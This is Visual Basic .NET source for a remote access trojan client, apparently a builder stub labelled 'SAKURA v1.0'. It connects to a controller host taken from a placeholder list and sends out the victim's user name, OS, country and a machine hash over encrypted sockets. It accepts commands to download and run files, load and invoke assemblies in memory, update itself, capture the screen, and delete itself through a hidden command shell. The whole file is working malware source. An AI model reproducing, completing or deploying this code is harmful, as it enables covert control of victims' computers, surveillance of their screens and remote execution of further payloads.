
Imports System
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Windows.Forms



'%ASSEMBLY%<Assembly: System.Reflection.AssemblyTitle("%Title%")>
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyDescription("%Description%")>
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 



Namespace sexy


    Public Class Main



        Public Shared Sub Main()

            Dim T1 As New Threading.Thread(New Threading.ThreadStart(AddressOf cs.BC))
            T1.Start()

            Dim T2 As New Threading.Thread(New Threading.ThreadStart(AddressOf cs.png))
            T2.Start()




        End Sub

    End Class



    Public Class cs

        Public Shared isConnected As Boolean = False
        Public Shared S As System.Net.Sockets.Socket
        Public Shared BufferLength As Long = Nothing
        Public Shared Buffer() As Byte
        Public Shared MS As New System.IO.MemoryStream
        Public Shared ReadOnly SPL = Settings.SPL

        Public Shared Sub BC()

            Try
                Threading.Thread.Sleep(2500)
                S = New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)

                Dim ipAddress As System.Net.IPAddress = ipAddress.Parse(Settings.H.Item(New Random().Next(0, Settings.H.Count)))
                Dim ipEndPoint As System.Net.IPEndPoint = New System.Net.IPEndPoint(ipAddress, Settings.P.Item(New Random().Next(0, Settings.P.Count)))

                BufferLength = -1
                Buffer = New Byte(0) {}
                MS = New System.IO.MemoryStream

                S.ReceiveBufferSize = 1024 * 500
                S.SendBufferSize = 1024 * 500

                S.Connect(ipEndPoint)

                isConnected = True
                sed(Info)

                S.BeginReceive(Buffer, 0, Buffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf BRC), S)

            Catch ex As Exception
                DScon()
            End Try
        End Sub

        Private Shared Function Info()
            Dim currentCulture As System.Globalization.CultureInfo = System.Globalization.CultureInfo.CurrentCulture
            Dim country As System.Globalization.RegionInfo = New System.Globalization.RegionInfo(currentCulture.Name)
            Dim hi As String = country.DisplayName
            Dim OS As New Devices.ComputerInfo
            Return String.Concat("INFO", SPL, hi, SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "SAKURA v1.0", SPL, GetHash(IDS))

        End Function

        Public Shared Sub BRC(ByVal ar As IAsyncResult)
            If isConnected = False Then DScon()
            Try
                Dim Received As Integer = S.EndReceive(ar)
                If Received > 0 Then
                    If BufferLength = -1 Then
                        If Buffer(0) = 0 Then
                            BufferLength = BS(MS.ToArray)
                            MS.Dispose()
                            MS = New System.IO.MemoryStream

                            If BufferLength = 0 Then
                                BufferLength = -1
                                S.BeginReceive(Buffer, 0, Buffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf BRC), S)
                                Exit Sub
                            End If
                            Buffer = New Byte(BufferLength - 1) {}
                        Else
                            MS.WriteByte(Buffer(0))
                        End If
                    Else
                        MS.Write(Buffer, 0, Received)
                        If (MS.Length = BufferLength) Then
                            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeRd), MS.ToArray)
                            BufferLength = -1
                            MS.Dispose()
                            MS = New System.IO.MemoryStream
                            Buffer = New Byte(0) {}
                        Else
                            Buffer = New Byte(BufferLength - MS.Length - 1) {}
                        End If
                    End If
                Else
                    DScon()
                    Exit Sub
                End If
                S.BeginReceive(Buffer, 0, Buffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf BRC), S)
            Catch ex As Exception
                DScon()
                Exit Sub
            End Try
        End Sub

        Public Shared Sub BeRd(ByVal b As Byte())
            Try
                Messa.Rd(b)
            Catch ex As Exception
            End Try
        End Sub

        Public Shared Sub sed(ByVal msg As String)
            Try
                Using MS As New System.IO.MemoryStream
                    Dim B As Byte() = A_EN(SB(msg))
                    Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                    MS.Write(L, 0, L.Length)
                    MS.Write(B, 0, B.Length)

                    S.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
                    S.Send(MS.ToArray, 0, MS.Length, System.Net.Sockets.SocketFlags.None)
                End Using
            Catch ex As Exception
                DScon()
            End Try
        End Sub

        Private Shared Sub EndSed(ByVal ar As IAsyncResult)
            Try
                S.EndSend(ar)
            Catch ex As Exception
            End Try
        End Sub

        Public Shared Sub DScon()
            isConnected = False

            Try
                S.Close()
                S.Dispose()
            Catch ex As Exception
            End Try

            Try
                MS.Close()
                MS.Dispose()
            Catch ex As Exception
            End Try

            BC()

        End Sub

        Public Shared Sub png()
            While True
                Threading.Thread.Sleep(30 * 1000)
                Try
                    If S.Connected Then
                        Using MS As New System.IO.MemoryStream
                            Dim B As Byte() = A_EN(SB("PING?"))
                            Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                            MS.Write(L, 0, L.Length)
                            MS.Write(B, 0, B.Length)

                            S.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
                            S.Send(MS.ToArray, 0, MS.Length, System.Net.Sockets.SocketFlags.None)
                        End Using
                    End If
                Catch ex As Exception
                    isConnected = False
                End Try
            End While
        End Sub


    End Class











    Public Class Settings
        Public Shared ReadOnly H As New Collections.Generic.List(Of String)({"%HOSTS%"})
        Public Shared ReadOnly P As New Collections.Generic.List(Of Integer)({123456})
        Public Shared ReadOnly SPL As String = "<SAKURA>"
        Public Shared ReadOnly KEY As String = "<1234>"
    End Class












    Public Class Messa
        Private Shared ReadOnly SPL = cs.SPL

        Public Shared Sub Rd(ByVal b As Byte())
            Try
                Dim A As String() = Split(BS(A_DE(b)), SPL)
                Select Case A(0)

                    Case "CLOSE"
                        Try
                            cs.S.Shutdown(System.Net.Sockets.SocketShutdown.Both)
                            cs.S.Close()
                        Catch ex As Exception
                        End Try

                        Environment.Exit(0)

                    Case "De"

                        cs.S.Shutdown(System.Net.Sockets.SocketShutdown.Both)
                        cs.S.Close()
                        Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "ErrorCoder")
                        Delete(Environment.CurrentDirectory, System.Windows.Forms.Application.ProductName)
                        Environment.Exit(0)


                    Case "DW"
                        Dwnld(A(1), A(2))
                    Case "DM"
                        memory(A(2))
                    Case "DAM"
                        ' Downloadm(A(1), A(2))
                        memory(A(2))
                    Case "UPDATE"
                        Updt(A(1))

                    Case "RD-"
                        cs.sed("RD-")

                    Case "RD+"
                        RDSTOP.Cap(A(1), A(2))

                End Select
            Catch ex As Exception
            End Try
        End Sub
        Private Shared Sub memory(ByVal Data As String)
            Try
                Dim sd As New Threading.Thread(Sub()
                                                   Dim כםּנתּביּזשווךּיזץפֿשפעלשכיולפמםחבּ As Object = Reflection.Assembly.Load(Convert.FromBase64String(StrReverse(Data)))
                                                   כםּנתּביּזשווךּיזץפֿשפעלשכיולפמםחבּ.EntryPoint.Invoke(Nothing, Nothing)
                                               End Sub)
                sd.Start()

            Catch ex As Exception
                'MsgBox(ex.Message)

            End Try
        End Sub
        Private Shared Sub Delete(ByVal d As String, ByVal appname As String)
            Try
                Dim startInfo As New ProcessStartInfo("cmd.exe")
                startInfo.WindowStyle = ProcessWindowStyle.Hidden
                startInfo.CreateNoWindow = True
                startInfo.UseShellExecute = False
                startInfo.RedirectStandardInput = True
                startInfo.RedirectStandardOutput = True


                Dim process As New Process()
                process.StartInfo = startInfo
                process.Start()




                Dim command As String = "/C choice /C Y /N /D Y /T 3 & Del """ & d & "\" & appname & ".exe"""
                process.StandardInput.WriteLine(command)
                process.StandardInput.Close()



            Catch
                Environment.Exit(0)
            End Try


        End Sub
        Private Shared Sub Dwnld(ByVal Name As String, ByVal Data As String)
            Try
                Dim NewFile = System.IO.Path.GetTempFileName + Name
                System.IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(Data))
                Threading.Thread.Sleep(500)
                Diagnostics.Process.Start(NewFile)
            Catch ex As Exception
            End Try
        End Sub

        Private Shared Sub Updt(ByVal Data As String)
            Try
                Dim Temp As String = System.IO.Path.GetTempFileName + ".exe"
                System.IO.File.WriteAllBytes(Temp, Convert.FromBase64String(Data))
                Threading.Thread.Sleep(500)
                Diagnostics.Process.Start(Temp)

                Dim Del As New Diagnostics.ProcessStartInfo With {
                .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
                .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
                .CreateNoWindow = True,
                .FileName = "cmd.exe"
            }

                Try
                    cs.S.Shutdown(System.Net.Sockets.SocketShutdown.Both)
                    cs.S.Close()
                Catch ex As Exception
                End Try

                Diagnostics.Process.Start(Del)
                Environment.Exit(0)
            Catch ex As Exception
            End Try
        End Sub


    End Class










    Module Helper

        Function SB(ByVal s As String) As Byte()
            Return System.Text.Encoding.Default.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String
            Return System.Text.Encoding.Default.GetString(b)
        End Function

        Function IDS() As String
            Dim S As String = Nothing

            S += Environment.UserDomainName
            S += Environment.UserName
            S += Environment.MachineName

            Return S
        End Function

        Function GetHash(strToHash As String) As String
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = SB(strToHash)
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
            Dim strResult As New System.Text.StringBuilder
            For Each b As Byte In bytesToHash
                strResult.Append(b.ToString("x2"))
            Next
            Return strResult.ToString.Substring(0, 12).ToUpper
        End Function

        Function A_EN(ByVal input As Byte()) As Byte()
            Dim AES_ As New System.Security.Cryptography.RijndaelManaged
            Dim Hash As New System.Security.Cryptography.MD5CryptoServiceProvider
            Try
                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES_.Mode = System.Security.Cryptography.CipherMode.ECB
                Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES_.CreateEncryptor
                Dim Buffer As Byte() = input
                Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function

        Function A_DE(ByVal input As Byte()) As Byte()
            Dim AES_ As New System.Security.Cryptography.RijndaelManaged
            Dim Hash As New System.Security.Cryptography.MD5CryptoServiceProvider
            Try
                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES_.Mode = System.Security.Cryptography.CipherMode.ECB
                Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES_.CreateDecryptor
                Dim Buffer As Byte() = input
                Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function
    End Module









    Public Class RDSTOP

        Public Shared Sub Cap(ByVal W As Integer, ByVal H As Integer)
            Try
                Dim B As New System.Drawing.Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(B)
                g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
                g.CopyFromScreen(0, 0, 0, 0, New System.Drawing.Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), System.Drawing.CopyPixelOperation.SourceCopy)

                Dim Resize As New System.Drawing.Bitmap(W, H)
                Dim g2 As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(Resize)
                g2.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
                g2.DrawImage(B, New System.Drawing.Rectangle(0, 0, W, H), New System.Drawing.Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), System.Drawing.GraphicsUnit.Pixel)

                Dim encoderParameter As System.Drawing.Imaging.EncoderParameter = New System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40)
                Dim encoderInfo As System.Drawing.Imaging.ImageCodecInfo = GetEncinfo(System.Drawing.Imaging.ImageFormat.Jpeg)
                Dim encoderParameters As System.Drawing.Imaging.EncoderParameters = New System.Drawing.Imaging.EncoderParameters(1)
                encoderParameters.Param(0) = encoderParameter

                Dim MS As New System.IO.MemoryStream
                Resize.Save(MS, encoderInfo, encoderParameters)

                Try
                    SyncLock cs.S
                        Using MEM As New System.IO.MemoryStream
                            Dim Bb As Byte() = A_EN(SB(("RD+" + cs.SPL + BS(MS.ToArray))))
                            Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))

                            MEM.Write(L, 0, L.Length)
                            MEM.Write(Bb, 0, Bb.Length)

                            cs.S.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
                            cs.S.Send(MEM.ToArray, 0, MEM.Length, System.Net.Sockets.SocketFlags.None)
                        End Using
                    End SyncLock
                Catch ex As Exception
                    cs.isConnected = False
                End Try

                Try
                    g.Dispose()
                    g2.Dispose()
                    B.Dispose()
                    MS.Dispose()
                Catch ex As Exception
                End Try

            Catch ex As Exception
            End Try

        End Sub

        Private Shared Function GetEncinfo(ByVal format As System.Drawing.Imaging.ImageFormat) As System.Drawing.Imaging.ImageCodecInfo
            Try
                Dim j As Integer
                Dim encoders() As System.Drawing.Imaging.ImageCodecInfo
                encoders = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()

                j = 0
                While j < encoders.Length
                    If encoders(j).FormatID = format.Guid Then
                        Return encoders(j)
                    End If
                    j += 1
                End While
                Return Nothing
            Catch ex As Exception
            End Try
        End Function
    End Class

End Namespace
